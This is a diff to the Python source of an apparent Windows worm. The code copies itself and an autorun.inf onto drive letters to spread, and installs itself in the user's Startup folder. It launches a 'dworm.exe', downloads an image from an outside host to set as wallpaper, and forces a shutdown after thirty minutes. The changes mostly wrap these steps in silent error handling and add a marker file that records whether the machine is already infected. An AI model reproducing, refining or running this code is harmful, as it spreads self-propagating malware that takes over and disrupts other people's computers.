@@ -21,14 +21,20 @@ def us():
 ;Open=%s
 ShellExecute=%s
 UseAutoPlay=1''' % (filen, filen)
-    build = open("autorun.inf", 'w')
-    build.write(autor)
-    build.close()
+    try:
+        build = open("autorun.inf", 'w')
+        build.write(autor)
+        build.close()
+    except:
+        pass
 
     def cpy(driveLetter):
         if os.system("cd " + driveLetter + ":") == 0:
             os.system("copy " + filen + " " + driveLetter + ":\\")
-            os.system("copy \"autorun.inf\"" + " " + driveLetter + ":\\")
+            try:
+                os.system("copy \"autorun.inf\"" + " " + driveLetter + ":\\")
+            except:
+                pass
         else:
             pass
     for d in range(5):
@@ -91,6 +97,7 @@ def shut():
         elif hhz == 60*30:
             os.system("shutdown /s")
         else:
+            print "hh"
             time.sleep(1)
 
 
@@ -127,13 +134,12 @@ def block():
 
 def wpp():
 
-    if cd != startxa:
-        wget.download("http://zepikao.my3gb.com/Sh3lz/fezinho.jpg")
-        os.system("move fezinho.jpg C:\\Users\\%username%\\Documents\\")
-
     walph = "C:\\Users\\" + quest + "\\Documents\\fezinho.jpg"
     SPI_SETDESKWALLPAPER = 20
-    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, walph , 0)
+    try:
+        ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, walph , 0)
+    except:
+        pass
 
 
 def dn():
@@ -179,12 +185,34 @@ wscript.sleep (int(Sound.currentmedia.duration)+1)*1000
     os.system("move dworm.exe " + disf)
     time.sleep(1)
 
+    wget.download("http://zepikao.my3gb.com/Sh3lz/fezinho.jpg")
+    os.system("move fezinho.jpg " + disf)
+
 
 def sc():
     global disd
     disd = "C:\Users" + "\\" + quest + "\Documents\\"
     os.system("start " + disd + "dworm.exe")
     us()
+
+
+def cdefi():
+    disf = "\"C:\Users" + "\\" + quest + "\Documents\""
+    cdefic = "1"
+    sbgcodew3 = open("cdefic.txt" , 'w')
+    sbgcodew3.write(cdefic)
+    sbgcodew3.close()
+    os.system("move cdefic.txt " + disf)
+
+
+def cdefic():
+    try:
+        disd = "C:\Users" + "\\" + quest + "\Documents\\"
+        a88 = open(disd + "cdefic.txt", 'r')
+        if a88.read() == "1":
+            return False
+    except:
+        return True
 
 
 def checkex():
@@ -199,10 +227,15 @@ def checkex():
     start = "\"C:\Users" + "\\" + quest + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\""
     global filen
     filen = "\"" + sys.argv[0] + "\""
+    disd = "C:\Users" + "\\" + quest + "\Documents\\"
 
-    if cd == startxa:
+    if cdefic() == False:
         ft = False
-        wpp()
+        print ft
+        try:
+            wpp()
+        except:
+            pass
         while 1 == 1:
             try:
                 pcho = random.choice([1, 2, 3, 4])
@@ -227,10 +260,18 @@ def checkex():
             except:
                 pass
     else:
+        cdefi()
         ft = True
         startupcom = "copy " + filen + " " + start
         os.system(startupcom)
-        dn()
+        try:
+            dn()
+        except:
+            pass
+        try:
+            wpp()
+        except:
+            pass
         shut()
 
 
